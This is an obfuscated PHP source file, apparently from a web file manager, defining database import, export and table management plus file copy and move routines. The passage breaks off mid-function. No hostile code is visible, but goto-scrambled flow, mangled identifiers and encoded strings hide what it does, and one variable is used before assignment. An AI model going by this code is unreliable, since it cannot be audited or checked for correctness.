<?php
 goto aŠ—ë“‡ŸØ; B¤ê®Øçî“: class DbManage { function __construct($CÇˆ†‘°Éç, $CŸÕ¶äŠµ§ = '') { $this->database = $CÇˆ†‘°Éç; $this->type = $CŸÕ¶äŠµ§; } public function model($A„º†§¿µ­ = '') { return new ModelBase($A„º†§¿µ­, $_SERVER[©][43], $this->database); } public function db($E‹Ú«ŸÕÛô = false) { goto f³Œ¨±‘ñ«; AÖìí‡óÚ : $C×±¬™ô†å = $d—ÃÀŒ‘£¶[$FëÊÜ¸Ç›[882]]; $d—ÃÀŒ‘£¶[$FëÊÜ¸Ç›[882]] = $FëÊÜ¸Ç›[43]; if ($d—ÃÀŒ‘£¶[$FëÊÜ¸Ç›[722]] == $FëÊÜ¸Ç›[723]) { $CÂ´¶ô–‚ = $d—ÃÀŒ‘£¶[$FëÊÜ¸Ç›[724]]; $d—ÃÀŒ‘£¶[$FëÊÜ¸Ç›[724]] = substr($CÂ´¶ô–‚, 0, strrpos($CÂ´¶ô–‚, $FëÊÜ¸Ç›[970])); } goto A±Ê”å™´ø; f³Œ¨±‘ñ«: $FëÊÜ¸Ç› =& $_SERVER[©]; $d—ÃÀŒ‘£¶ = array_change_key_case($this->database); if ($this->type == $FëÊÜ¸Ç›[19] || !$E‹Ú«ŸÕÛô) { return $this->model()->db(); } goto AÖìí‡óÚ ; A±Ê”å™´ø: $this->database = $d—ÃÀŒ‘£¶; $fŞÛ‡„ÃœŒ = $this->model()->db(); try { $cËÒòäÀ…à = $fŞÛ‡„ÃœŒ->execute("\x73\x68\157\x77\x20\x64\x61\x74\x61\142\141\163\x65\163\x20\154\x69\x6b\x65\40\x27{$C×±¬™ô†å}\47"); } catch (Exception $bÌºá†•¦) { } goto dÈ ‰…Ùø; C¡Íª˜—ó×: $this->database = $d—ÃÀŒ‘£¶; $fŞÛ‡„ÃœŒ->execute("\165\163\x65\x20\140{$C×±¬™ô†å}\x60"); return $fŞÛ‡„ÃœŒ; goto C®˜”Ô–İå; dÈ ‰…Ùø: if (!$cËÒòäÀ…à) { $fŞÛ‡„ÃœŒ->execute("\143\x72\x65\141\x74\x65\x20\x64\141\x74\x61\x62\141\163\x65\40\140{$C×±¬™ô†å}\x60"); } $d—ÃÀŒ‘£¶[$FëÊÜ¸Ç›[882]] = $C×±¬™ô†å; if ($d—ÃÀŒ‘£¶[$FëÊÜ¸Ç›[722]] == $FëÊÜ¸Ç›[723]) { $d—ÃÀŒ‘£¶[$FëÊÜ¸Ç›[724]] .= $FëÊÜ¸Ç›[970] . $C×±¬™ô†å; } goto C¡Íª˜—ó×; C®˜”Ô–İå: } public function createTable($cÂ£ñç¨ì”, $C‹àôæÂØ = null) { $bƒ‚«ğªã† =& $_SERVER[©]; if (!IO::exist($cÂ£ñç¨ì”)) { show_json(LNG($bƒ‚«ğªã†[971]), !1); } $eÓµ„¢é” = sqlSplit(IO::getContent($cÂ£ñç¨ì”)); foreach ($eÓµ„¢é” as $e íŒ§Ñ) { if ($C‹àôæÂØ) { $BßÌßŸ‹í = stripos($e íŒ§Ñ, $bƒ‚«ğªã†[972]) === 0; if ($BßÌßŸ‹í) { $C‹àôæÂØ->task[$bƒ‚«ğªã†[973]] += 1; } } $this->model()->db()->execute($e íŒ§Ñ); if ($C‹àôæÂØ && $BßÌßŸ‹í) { preg_match($bƒ‚«ğªã†[974], $e íŒ§Ñ, $dÛŸÏ¹ƒöÆ); $C‹àôæÂØ->task[$bƒ‚«ğªã†[975]] = $dÛŸÏ¹ƒöÆ[1]; $C‹àôæÂØ->update(1); } } $this->taskToCache($C‹àôæÂØ); } public function insertTable($B”×ë× Ñ¡, $dâ¡î¿„‹ = null) { $b§óŸÂ†«¼ =& $_SERVER[©]; $dÃ½Ù–ğ = $this->model()->db(); $d´Š…‹²Öº = $DÑòÇ‡½ ? array($DÑòÇ‡½) : $dÃ½Ù–ğ->getTables(); foreach ($B”×ë× Ñ¡ as $fÎç¦¨ê¸ó) { $DÑòÇ‡½ = basename($fÎç¦¨ê¸ó, $b§óŸÂ†«¼[717]); if (!in_array($DÑòÇ‡½, $d´Š…‹²Öº)) { continue; } if ($dâ¡î¿„‹) { $dâ¡î¿„‹->task[$b§óŸÂ†«¼[975]] = $DÑòÇ‡½; } if (get_filesize($fÎç¦¨ê¸ó) == 0) { continue; } $b¯éÚÅ–Œç = $this->sqlToDb($fÎç¦¨ê¸ó, $dâ¡î¿„‹); if (!$b¯éÚÅ–Œç) { show_json(LNG($b§óŸÂ†«¼[976]) . "\133{$DÑòÇ‡½}\x5d", !1); } } $this->taskToCache($dâ¡î¿„‹); } public function sqlFromDb($E¹ÂÙä³Ú¹, $fÈ¸ç‹°ê†, $f‹‡ò‰Ê÷ğ = null, $Eã¹ö¥ëóÃ = null) { goto A»ÁèÍ„º³; FÁ‰‘ŒŸÛ¥: $dÛò†²§¾ = $fãÓ…‰¬óÁ->getPk(); $eèŒ¬éÄ–¦ = $fãÓ…‰¬óÁ->getDbFields(); do { $A¾ïÁçï¼ì = $fãÓ…‰¬óÁ->field($eèŒ¬éÄ–¦)->order($dÛò†²§¾ . $_SERVER[©][978])->selectPage($E¼§ê³¸ª†, $aÕ±—÷é§›); $FæÓê‘åšó = isset($A¾ïÁçï¼ì[$_SERVER[©][360]][$_SERVER[©][362]]) ? $A¾ïÁçï¼ì[$_SERVER[©][360]][$_SERVER[©][362]] : 0; $a–â÷¤•µÁ = !empty($A¾ïÁçï¼ì[$_SERVER[©][363]]) ? $A¾ïÁçï¼ì[$_SERVER[©][363]] : array(); if (!($C÷„Ğ¹¨Â = count($a–â÷¤•µÁ))) { break; } $BíÇ²Öâ³È = array(); foreach ($a–â÷¤•µÁ as $B®ôáÖ½¤­) { if ($E¹ÂÙä³Ú¹ == $_SERVER[©][979] && $B®ôáÖ½¤­[$_SERVER[©][39]] == $_SERVER[©][980]) { $EÛš…ÛŸñ = json_decode($B®ôáÖ½¤­[$_SERVER[©][368]], !0); if ($EÛš…ÛŸñ[$_SERVER[©][38]] == date($_SERVER[©][689]) && !$EÛš…ÛŸñ[$_SERVER[©][688]]) { continue; } } if ($Eã¹ö¥ëóÃ) { $B®ôáÖ½¤­[$_SERVER[©][85]] = "\173\x69\157\72{$Eã¹ö¥ëóÃ}\x7d" . substr($B®ôáÖ½¤­[$_SERVER[©][85]], strlen("\x7b\x69\157\x3a{$B®ôáÖ½¤­[$_SERVER[©][743]]}\175")); $B®ôáÖ½¤­[$_SERVER[©][743]] = $Eã¹ö¥ëóÃ; } $BíÇ²Öâ³È[] = $_SERVER[©][981] . $this->sqlEncode($B®ôáÖ½¤­) . $_SERVER[©][982]; } $c‘â¨¶†Í = "\x49\116\x53\x45\122\x54\x20\x49\x4e\x54\117\40\x60{$E¹ÂÙä³Ú¹}\x60\40\50\140" . implode($_SERVER[©][983], $eèŒ¬éÄ–¦) . $_SERVER[©][984]; fwrite($F‚÷‚à×ÑÍ, $c‘â¨¶†Í . implode($_SERVER[©][985], $BíÇ²Öâ³È) . $_SERVER[©][77] . PHP_EOL); $aÕ±—÷é§›++; $A¤¾¶¸éĞ += $C÷„Ğ¹¨Â; if ($f‹‡ò‰Ê÷ğ) { $f‹‡ò‰Ê÷ğ->update($C÷„Ğ¹¨Â); } } while ($aÕ±—÷é§› <= $FæÓê‘åšó); goto c÷è©§Š; d¼†¤İ©ˆ©: $aÕ±—÷é§› = 1; $E¼§ê³¸ª† = 500; $F‚÷‚à×ÑÍ = fopen($fÈ¸ç‹°ê†, $_SERVER[©][977]); goto FÁ‰‘ŒŸÛ¥; c÷è©§Š: fclose($F‚÷‚à×ÑÍ); return $A¤¾¶¸éĞ; goto F¿£à¶¬†; A»ÁèÍ„º³: if ($f‹‡ò‰Ê÷ğ) { $f‹‡ò‰Ê÷ğ->task[$_SERVER[©][975]] = $E¹ÂÙä³Ú¹; } $fãÓ…‰¬óÁ = $this->model($E¹ÂÙä³Ú¹); $A¤¾¶¸éĞ = 0; goto d¼†¤İ©ˆ©; F¿£à¶¬†: } public function sqlToDb($aÇ×« ¯öâ, $Fø“‘º©Î = null) { goto d…Œ­‘¶Üš; d…Œ­‘¶Üš: $e†˜ãßæ˜ø =& $_SERVER[©]; $DñËÂ“Ôˆ = $this->model()->db(); $FÅºõÉáÊ = @fopen($aÇ×« ¯öâ, $e†˜ãßæ˜ø[986]); goto C †Úë¼£¥; BÍß‘‘‘§: $AÇ‚É½áó¤ = 500 + 1; while (!feof($FÅºõÉáÊ)) { if ($Fø“‘º©Î && $Eµç¼ãÄŠæ != 0) { $Fø“‘º©Î->task[$e†˜ãßæ˜ø[973]] += 1; } $Eµç¼ãÄŠæ++; $aòİ‡³ó»ò = trim(fgets($FÅºõÉáÊ)); $BÑâ¶­¶Í© .= $e†˜ãßæ˜ø[60] . $this->sqlDecode($aòİ‡³ó»ò, $this->type); if ($Eµç¼ãÄŠæ == $AÇ‚É½áó¤) { $BÑâ¶­¶Í© = rtrim(trim($BÑâ¶­¶Í©), $e†˜ãßæ˜ø[77]); if (!$DñËÂ“Ôˆ->execute($BÑâ¶­¶Í©)) { return !1; } if ($Fø“‘º©Î) { $Fø“‘º©Î->update($Eµç¼ãÄŠæ - 1); } $BÑâ¶­¶Í© = $e†˜ãßæ˜ø[43]; $Eµç¼ãÄŠæ = 0; } } fclose($FÅºõÉáÊ); goto fÖ×Œ‹‘·; C †Úë¼£¥: if (!$FÅºõÉáÊ) { return !1; } $Eµç¼ãÄŠæ = 0; $BÑâ¶­¶Í© = $e†˜ãßæ˜ø[43]; goto BÍß‘‘‘§; fÖ×Œ‹‘·: if (trim($BÑâ¶­¶Í©)) { $BÑâ¶­¶Í© = rtrim(trim($BÑâ¶­¶Í©), $e†˜ãßæ˜ø[77]); if (!$DñËÂ“Ôˆ->execute($BÑâ¶­¶Í©)) { return !1; } if ($Fø“‘º©Î) { $Fø“‘º©Î->update($Eµç¼ãÄŠæ - 1); } } return !0; goto BÕ´Ùİ§å­; BÕ´Ùİ§å­: } public function dropTable($fåÄğ Í¦ = null) { $F‰ÉØšµô = $this->model()->db(); $E›­¥—¾»‰ = $fåÄğ Í¦ ? array($fåÄğ Í¦) : $F‰ÉØšµô->getTables(); if (!$E›­¥—¾»‰) { return; } foreach ($E›­¥—¾»‰ as $fåÄğ Í¦) { $F‰ÉØšµô->execute("\144\162\157\160\x20\x74\141\x62\x6c\145\40\x69\x66\x20\145\x78\151\x73\164\163\x20\x60{$fåÄğ Í¦}\140"); } } private function taskToCache($eÊÌ‘Á¯Û = null) { $BøĞÈ¦‹½à =& $_SERVER[©]; if (!$eÊÌ‘Á¯Û) { return; } $aîÖÒ½Ãäš = array($BøĞÈ¦‹½à[975] => $eÊÌ‘Á¯Û->task[$BøĞÈ¦‹½à[975]], $BøĞÈ¦‹½à[973] => $eÊÌ‘Á¯Û->task[$BøĞÈ¦‹½à[973]], $BøĞÈ¦‹½à[987] => $eÊÌ‘Á¯Û->task[$BøĞÈ¦‹½à[987]]); if ($aîÖÒ½Ãäš[$BøĞÈ¦‹½à[973]] == $aîÖÒ½Ãäš[$BøĞÈ¦‹½à[987]]) { $aîÖÒ½Ãäš[$BøĞÈ¦‹½à[695]] = 1; } Cache::set($BøĞÈ¦‹½à[988] . $eÊÌ‘Á¯Û->task[$BøĞÈ¦‹½à[375]], $aîÖÒ½Ãäš); $eÊÌ‘Á¯Û->end(); } private function sqlEncode($cÖ†ãòÒ£) { $d´‰³ñ· =& $_SERVER[©]; $bš‚éÉÀİŸ = array(); foreach ($cÖ†ãòÒ£ as $DÛ¹ÖÁîÑ) { if (is_array($DÛ¹ÖÁîÑ)) { $DÛ¹ÖÁîÑ = json_encode_force($DÛ¹ÖÁîÑ); } $DÛ¹ÖÁîÑ = addslashes($DÛ¹ÖÁîÑ); $DÛ¹ÖÁîÑ = str_replace(array($d´‰³ñ·[989], $d´‰³ñ·[9]), array($d´‰³ñ·[990], $d´‰³ñ·[991]), $DÛ¹ÖÁîÑ); $bš‚éÉÀİŸ[] = str_replace($d´‰³ñ·[65], $d´‰³ñ·[992], $DÛ¹ÖÁîÑ); } return $d´‰³ñ·[65] . implode($d´‰³ñ·[993], $bš‚éÉÀİŸ) . $d´‰³ñ·[65]; } private function sqlDecode($DíÓÚœ„‰‘, $CÁ°Ä¸×«) { $a½”µ­„ç =& $_SERVER[©]; $DíÓÚœ„‰‘ = str_replace(array($a½”µ­„ç[990], $a½”µ­„ç[991]), array($a½”µ­„ç[989], $a½”µ­„ç[9]), $DíÓÚœ„‰‘); if ($CÁ°Ä¸×« == $a½”µ­„ç[19]) { $DíÓÚœ„‰‘ = stripslashes($DíÓÚœ„‰‘); } return $DíÓÚœ„‰‘; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($aâ´ò·®ÑÅ, $AÈÕõœƒÏ’) { $b‡ÊòìôšŠ = self::driverMake($AÈÕõœƒÏ’[0]); if (method_exists($b‡ÊòìôšŠ, $aâ´ò·®ÑÅ)) { return @call_user_func_array(array($b‡ÊòìôšŠ, $aâ´ò·®ÑÅ), $AÈÕõœƒÏ’); } if (method_exists($b‡ÊòìôšŠ, $_SERVER[©][994])) { return @call_user_func_array(array($b‡ÊòìôšŠ, $aâ´ò·®ÑÅ), $AÈÕõœƒÏ’); } else { if (method_exists(self, $aâ´ò·®ÑÅ)) { return @call_user_func_array(array(self, $aâ´ò·®ÑÅ), $AÈÕõœƒÏ’); } else { call_user_func_array(array(parent, $aâ´ò·®ÑÅ), $AÈÕõœƒÏ’); } } } public static function init($EñÒ¹°”Â¹) { return self::driverMake($EñÒ¹°”Â¹); } public static function copy($dÃÊÖ‹Ü‹, $Fäğ¨ÂíæÒ, $cĞƒØ¡Ûà¥ = false, $C£ºˆÊÚî = false) { return self::copyMove($dÃÊÖ‹Ü‹, $Fäğ¨ÂíæÒ, $cĞƒØ¡Ûà¥, $_SERVER[©][498], $C£ºˆÊÚî); } public static function move($aÌàğ”Ïá, $A¹ùí ÑßÂ, $Có›ÜÕ« = false, $e¸©³ñ«¨— = false) { return self::copyMove($aÌàğ”Ïá, $A¹ùí ÑßÂ, $Có›ÜÕ«, $_SERVER[©][500], $e¸©³ñ«¨—); } public static function saveFile($a÷õ²³½”â, $EÍÕóÇ‚›², $DğÅ÷İº¤ = true) { goto FèÖ¶‡åš; cš¹ŸÔÖî¡: $b‘ĞŒ†«á‘ = $eù¬Âñ¨²Û->pathFather($EÍÕóÇ‚›²); $fÖ ½İ»¯‹ = !0; if (!$DğÅ÷İº¤ && self::driverIsSame($AÑ²¥¥±„ç, $eù¬Âñ¨²Û)) { $fÖ ½İ»¯‹ = !1; } goto fº´èˆ—¬; fº´èˆ—¬: $A®£ïª‘Ô¤ = self::copyFile($AÑ²¥¥±„ç, $a÷õ²³½”â, $eù¬Âñ¨²Û, $b‘ĞŒ†«á‘, $f¿ƒ•ÎİĞ[$b“‡Æ×¬Ë[38]], $fÖ ½İ»¯‹); if ($eîö«§Ò×ó) { $A®£ïª‘Ô¤ = $eîö«§Ò×ó->getPathOuter($A®£ïª‘Ô¤); } return $A®£ïª‘Ô¤; goto fÜèŒˆ×£¿; FèÖ¶‡åš: $b“‡Æ×¬Ë =& $_SERVER[©]; $f¿ƒ•ÎİĞ = self::info($EÍÕóÇ‚›²); $AÑ²¥¥±„ç = self::driverMake($a÷õ²³½”â); goto FØ™´–é¯ô; FØ™´–é¯ô: $eù¬Âñ¨²Û = self::driverMake($EÍÕóÇ‚›²); $eîö«§Ò×ó = !1; if ($eù¬Âñ¨²Û->pathParse[$b“‡Æ×¬Ë[995]]) { $DãÍÅÌŸ£ = $eù¬Âñ¨²Û->pathParse[$b“‡Æ×¬Ë[995]]; $eîö«§Ò×ó = $eù¬Âñ¨²Û; $eù¬Âñ¨²Û = self::driverMake($DãÍÅÌŸ£); } goto cš¹ŸÔÖî¡; fÜèŒˆ×£¿: } private static function copyMove($AóÆçÌ½Ëõ, $DÜÏñÌ›èÃ, $bÖŒØ¥Í, $BÚàÕ« ­, $e„ŒÇ‘¥Ş = false) { goto F‰ÖÉ¢Ø½; F‰ÖÉ¢Ø½: $c©¾°ŒÕù =& $_SERVER[©]; if (!$AóÆçÌ½Ëõ || $AóÆçÌ½Ëõ == $c©¾°ŒÕù[18] || !$DÜÏñÌ›èÃ) { return !1; } ignore_timeout(); goto c˜¼éî¼; dÖÃ¬¦çğ: $Cù‚Ğ˜¯¦” = $D¨ğ™ÃÄ…->isFile($AóÆçÌ½Ëõ); if (!$Cù‚Ğ˜¯¦” && $bÑà¨ã¿‚˜->getType() == $c©¾°ŒÕù[693] && $D¨ğ™ÃÄ…->getType() == $c©¾°ŒÕù[112]) { $Fè‡¸­šÎĞ = $bÑà¨ã¿‚˜->copyFolderFromIO($D¨ğ™ÃÄ…, $AóÆçÌ½Ëõ, $DÜÏñÌ›èÃ, $bÖŒØ¥Í, $c•Š†Óí, $e„ŒÇ‘¥Ş); } else { $Fè‡¸­šÎĞ = self::copyPath($D¨ğ™ÃÄ…, $AóÆçÌ½Ëõ, $bÑà¨ã¿‚˜, $DÜÏñÌ›èÃ, $bÖŒØ¥Í, $c•Š†Óí, $Cù‚Ğ˜¯¦”, $e„ŒÇ‘¥Ş); } if ($Fè‡¸­šÎĞ && $c•Š†Óí) { $D¨ğ™ÃÄ…->remove($AóÆçÌ½Ëõ); } goto cï£Ü³÷ƒÂ; e¯Óô°‚ªô: Hook::trigger($c©¾°ŒÕù[82], $D¨ğ™ÃÄ…, $AóÆçÌ½Ëõ, $bÑà¨ã¿‚˜, $DÜÏñÌ›èÃ); $fÙ£Öª÷É¬ = self::driverIsSame($D¨ğ™ÃÄ…, $bÑà¨ã¿‚˜); if ($fÙ£Öª÷É¬) { if ($BÚàÕ« ­ == $c©¾°ŒÕù[500] && !method_exists($bÑà¨ã¿‚˜, $c©¾°ŒÕù[996]) && trim($DÜÏñÌ›èÃ, $c©¾°ŒÕù[18]) == trim($bÑà¨ã¿‚˜->pathFather($AóÆçÌ½Ëõ), $c©¾°ŒÕù[18])) { return $bÑà¨ã¿‚˜->getPathOuter($AóÆçÌ½Ëõ); } if (method_exists($bÑà¨ã¿‚˜, $BÚàÕ« ­)) { return $bÑà¨ã¿‚˜->{$BÚàÕ« ­}($AóÆçÌ½Ëõ, $DÜÏñÌ›èÃ, $bÖŒØ¥Í); } } goto dÖÃ¬¦çğ; cï£Ü³÷ƒÂ: if ($cçŒ„Õœ“Ÿ) { $Fè‡¸­šÎĞ = $cçŒ„Õœ“Ÿ->getPathOuter($Fè‡¸­šÎĞ); } return $Fè‡¸­šÎĞ; goto DÊä‡ŒİŒ£; c˜¼éî¼: $D¨ğ™ÃÄ… = self::driverMake($AóÆçÌ½Ëõ); $bÑà¨ã¿‚˜ = self::driverMake($DÜÏñÌ›èÃ); $c•Š†Óí = $BÚàÕ« ­ == $c©¾°ŒÕù[500]; goto D¿â‘ƒ²; D¿â‘ƒ²: $cçŒ„Õœ“Ÿ = !1; if ($bÑà¨ã¿‚˜->pathParse[$c©¾°ŒÕù[995]]) { $DÜÏñÌ›èÃ = $bÑà¨ã¿‚˜->pathParse[$c©¾°ŒÕù[995]]; $cçŒ„Õœ“Ÿ = $bÑà¨ã¿‚˜; $bÑà¨ã¿‚˜ = self::driverMake($DÜÏñÌ›èÃ); } self::check($D¨ğ™ÃÄ…, $AóÆçÌ½Ëõ, $bÑà¨ã¿‚˜, $DÜÏñÌ›èÃ); goto e¯Óô°‚ªô; DÊä‡ŒİŒ£: } private static function check($CïìÄçˆ³, $Døäˆ©ÈÙÜ, $eƒ¬öĞ¾÷¯, &$bÀÚÔäÎ½Œ) { $AÎ×Ø Äœ× =& $_SERVER[©]; if (self::driverIsSame($CïìÄçˆ³, $eƒ¬öĞ¾÷¯) && $CïìÄçˆ³->isFolder($Døäˆ©ÈÙÜ) && $CïìÄçˆ³->isParentOf($Døäˆ©ÈÙÜ, $bÀÚÔäÎ½Œ)) { show_json(LNG($AÎ×Ø Äœ×[997]), !1); } if (!$CïìÄçˆ³->exist($Døäˆ©ÈÙÜ)) { show_json(LNG($AÎ×Ø Äœ×[111]), !1); } } private static function copyPath($AªÎ …‡Ú¶, $eÛµïÚòÄé, $aøŸ…ê¸ïİ, $dâÇ‰ĞÎÆæ, $cˆØ…¦, $D¾è¥¯äÙÚ, $Bù‹£Ä†¾ø, $Fğ›Ğ¡áÄ– = false) { goto bíƒ¦•æÕè; dˆÒòé©Ë”: if ($Bù‹£Ä†¾ø) { return self::copyFile($AªÎ …‡Ú¶, $eÛµïÚòÄé, $aøŸ…ê¸ïİ, $dâÇ‰ĞÎÆæ, $A’½ĞóğŒ, $D¾è¥¯äÙÚ); } if ($cˆØ…¦ == REPEAT_RENAME_FOLDER) { $cˆØ…¦ = !1; } $Bã¢ƒ¢’Çñ = rtrim($dâÇ‰ĞÎÆæ, $e£•¼© ¬Ï[18]) . $e£•¼© ¬Ï[18] . $A’½ĞóğŒ; goto c¼àÈ©ø…; c¼àÈ©ø…: $D°¢Œ¤©•Ò = $aøŸ…ê¸ïİ->mkdir($aøŸ…ê¸ïİ->getPath($Bã¢ƒ¢’Çñ)); $dâÇ‰ĞÎÆæ = $aøŸ…ê¸ïİ->getPathInner($D°¢Œ¤©•Ò); $E©âÃˆî× = $AªÎ …‡Ú¶->listPath($eÛµïÚòÄé, !0); goto F›÷ÚÊ„°; bíƒ¦•æÕè: $e£•¼© ¬Ï =& $_SERVER[©]; $A’½ĞóğŒ = $Fğ›Ğ¡áÄ– ? $Fğ›Ğ¡áÄ– : $AªÎ …‡Ú¶->getPathName($AªÎ …‡Ú¶->pathThis($eÛµïÚòÄé)); if ($cˆØ…¦) { $c‘İÉïº­Ë = $aøŸ…ê¸ïİ->fileNameExist($dâÇ‰ĞÎÆæ, $A’½ĞóğŒ); $A’½ĞóğŒ = $aøŸ…ê¸ïİ->fileNameAuto($dâÇ‰ĞÎÆæ, $A’½ĞóğŒ, $cˆØ…¦, !$Bù‹£Ä†¾ø); $cˆØ…¦ = $c‘İÉïº­Ë ? $cˆØ…¦ : !1; } goto dˆÒòé©Ë”; F›÷ÚÊ„°: $DĞ³”Ò’ƒ = array_merge($E©âÃˆî×[$e£•¼© ¬Ï[83]], $E©âÃˆî×[$e£•¼© ¬Ï[84]]); foreach ($DĞ³”Ò’ƒ as $bÛŠß·àù) { $B³Æ¥˜‡­“ = $bÛŠß·àù[$e£•¼© ¬Ï[39]] == $e£•¼© ¬Ï[177]; $eÛµïÚòÄé = $AªÎ …‡Ú¶->getPathInner($bÛŠß·àù[$e£•¼© ¬Ï[85]]); $c¿Ñ¸£©‡à = self::copyPath($AªÎ …‡Ú¶, $eÛµïÚòÄé, $aøŸ…ê¸ïİ, $dâÇ‰ĞÎÆæ, $cˆØ…¦, $D¾è¥¯äÙÚ, $B³Æ¥˜‡­“); if (!$c¿Ñ¸£©‡à) { write_log($e£•¼© ¬Ï[998] . $eÛµïÚòÄé . $e£•¼© ¬Ï[999] . $dâÇ‰ĞÎÆæ, $e£•¼© ¬Ï[1000]); } } return $D°¢Œ¤©•Ò; goto cô‚§„Çäï; cô‚§„Çäï: } private static function copyFile($F«ÕÕœ”á, $Eöâ½ªï‚Ó, $E‡„÷ïƒ», $e†èŸîß«¬, $cÖº»Ù´¶, $eĞ„ÂñÃ‘) { goto D‰¥½ò³‰ö; aÓí½à¯ñô: $Fˆ¹‰Š––Á = $F«ÕÕœ”á->iconvApp($Fˆ¹‰Š––Á); $C´ìÀä­ë = $E‡„÷ïƒ»->upload($e†èŸîß«¬, $Fˆ¹‰Š––Á, $eĞ„ÂñÃ‘); self::remove($d„ÙóìÀ . $dëÕÕœòõó); goto D¸ìÉª˜½; D¸ìÉª˜½: Hook::trigger($E½Ùê¿Íó¾[1003], $F«ÕÕœ”á, $Eöâ½ªï‚Ó, $E‡„÷ïƒ», $e†èŸîß«¬, $cÖº»Ù´¶, $C´ìÀä­ë); return $C´ìÀä­ë; goto b¨ÊÁ„¸·±; F´ê†ÑÍ§: Hook::trigger($E½Ùê¿Íó¾[1002], $F«ÕÕœ”á, $Eöâ½ªï‚Ó, $E‡„÷ïƒ», $e†èŸîß«¬, $cÖº»Ù´¶, $dëÕÕœòõó); if (self::driverIsSame($F«ÕÕœ”á, $E‡„÷ïƒ»)) { if ($eĞ„ÂñÃ‘) { $C´ìÀä­ë = $E‡„÷ïƒ»->moveFile($Eöâ½ªï‚Ó, $e†èŸîß«¬); } else { $C´ìÀä­ë = $E‡„÷ïƒ»->copyFile($Eöâ½ªï‚Ó, $e†èŸîß«¬); } Hook::trigger($E½Ùê¿Íó¾[1003], $F«ÕÕœ”á, $Eöâ½ªï‚Ó, $E‡„÷ïƒ», $e†èŸîß«¬, $cÖº»Ù´¶, $C´ìÀä­ë); return $C´ìÀä­ë; } $d„ÙóìÀ = TEMP_FILES; goto bÌÙ¶ãˆ¸ø; D‰¥½ò³‰ö: $E½Ùê¿Íó¾ =& $_SERVER[©]; $e†èŸîß«¬ = $E‡„÷ïƒ»->getPath(rtrim($e†èŸîß«¬, $E½Ùê¿Íó¾[18]) . $E½Ùê¿Íó¾[18] . $cÖº»Ù´¶); $dëÕÕœòõó = $E½Ùê¿Íó¾[1001] . time() . rand_string(5); goto F´ê†ÑÍ§; bÌÙ¶ãˆ¸ø: mk_dir($d„ÙóìÀ); $Fˆ¹‰Š––Á = $d„ÙóìÀ . $dëÕÕœòõó; $Fˆ¹‰Š––Á = $F«ÕÕœ”á->download($Eöâ½ªï‚Ó, $Fˆ¹‰Š––Á); goto aÓí½à¯ñô; b¨ÊÁ„¸·±: } public static function pathFather($A…©‘œŒ…ö) { $dÒ§ñ®ÌÛ = IO::init($A…©‘œŒ…ö); $e›„Ï¦¹Áå = $dÒ§ñ®ÌÛ->pathFather($dÒ§ñ®ÌÛ->path); return $dÒ§ñ®ÌÛ->getPathOuter($e›„Ï¦¹Áå); } public static function fileOut($Cä»‡çµë, $d·„òÉ‚É¡ = false, $EŸ£÷ÏÄ = false, $cò¹¶ˆëÖ® = '') { $AŒï‹ˆ³Áñ = self::driverMake($Cä»‡çµë); if ($AŒï‹ˆ³Áñ->isFileOutServer()) { return $AŒï‹ˆ³Áñ->fileOutServer($Cä»‡çµë, $d·„òÉ‚É¡, $EŸ£÷ÏÄ, $cò¹¶ˆëÖ®); } return $AŒï‹ˆ³Áñ->fileOut($Cä»‡çµë, $d·„òÉ‚É¡, $EŸ£÷ÏÄ, $cò¹¶ˆëÖ®); } public static function fileOutImage($fŸ˜ç­í‚¡, $dŸéÏÁ‘  = 250) { $AÀ Ÿòù¨— = array(250, 600, 1200, 3000); for ($EĞË®Ø¸¼Ô = 0; $EĞË®Ø¸¼Ô < count($AÀ Ÿòù¨—); $EĞË®Ø¸¼Ô++) { if ($EĞË®Ø¸¼Ô == 0 && $dŸéÏÁ‘  <= $AÀ Ÿòù¨—[$EĞË®Ø¸¼Ô]) { $dŸéÏÁ‘  = $AÀ Ÿòù¨—[$EĞË®Ø¸¼Ô]; break; } else { if ($dŸéÏÁ‘  > $AÀ Ÿòù¨—[$EĞË®Ø¸¼Ô - 1] && $dŸéÏÁ‘  <= $AÀ Ÿòù¨—[$EĞË®Ø¸¼Ô]) { $dŸéÏÁ‘  = $AÀ Ÿòù¨—[$EĞË®Ø¸¼Ô]; break; } else { if ($EĞË®Ø¸¼Ô == count($AÀ Ÿòù¨—) - 1 && $dŸéÏÁ‘  > $AÀ Ÿòù¨—[$EĞË®Ø¸¼Ô]) { $dŸéÏÁ‘  = $AÀ Ÿòù¨—[$EĞË®Ø¸¼Ô]; break; } } } } $CØ­ÃœƒƒŞ = self::driverMake($fŸ˜ç­í‚¡); if ($CØ­ÃœƒƒŞ->isFileOutServer()) { return $CØ­ÃœƒƒŞ->fileOutImageServer($fŸ˜ç­í‚¡, $dŸéÏÁ‘ ); } return $CØ­ÃœƒƒŞ->fileOutImage($fŸ˜ç­í‚¡, $dŸéÏÁ‘ ); } private static function driverIsSame($Döñ¬ğˆ°É, $EµøÁ¹š‘‚) { goto B…­¨ŠÇ¥; F‚ êèÚŞ: if ($Döñ¬ğˆ°É->pathDriver == $EµøÁ¹š‘‚->pathDriver) { return !0; } return !1; goto E¢ãõÅ²÷Ÿ; f»‹¨ª¾Şù: if ($Bšµ†Ô÷ŒÇ != $c‘¹¡Ä‰÷ˆ) { return !1; } if ($Bšµ†Ô÷ŒÇ == $C¹ĞÓÊ¶‹’[693]) { return !0; } if ($Bšµ†Ô÷ŒÇ == $C¹ĞÓÊ¶‹’[112]) { return !0; } goto F‚ êèÚŞ; B…­¨ŠÇ¥: $C¹ĞÓÊ¶‹’ =& $_SERVER[©]; $Bšµ†Ô÷ŒÇ = $Döñ¬ğˆ°É->getType(); $c‘¹¡Ä‰÷ˆ = $EµøÁ¹š‘‚->getType(); goto f»‹¨ª¾Şù; E¢ãõÅ²÷Ÿ: } public static function copyUpdate($eî¾¾Ù¹Õ¾, $B×¯È¥…¹‚) { goto EßªˆØé; aÀ½Á£¿Ü´: $eŸÜÆ”‘£µ = array(); foreach ($bâ«é•µ¯ß as $b¨¸Àë ö” => $C‚åòÄ“Å) { if (isset($C¡áµ³¾ùÄ[$b¨¸Àë ö”])) { if ($C‚åòÄ“Å[$e÷Ñ·È‚£â[86]] == 1) { continue; } if ($C¡áµ³¾ùÄ[$b¨¸Àë ö”][$e÷Ñ·È‚£â[87]] == $C‚åòÄ“Å[$e÷Ñ·È‚£â[87]]) { continue; } } if ($C‚åòÄ“Å[$e÷Ñ·È‚£â[86]] == 1) { $eŸÜÆ”‘£µ[] = $B×¯È¥…¹‚ . $e÷Ñ·È‚£â[18] . 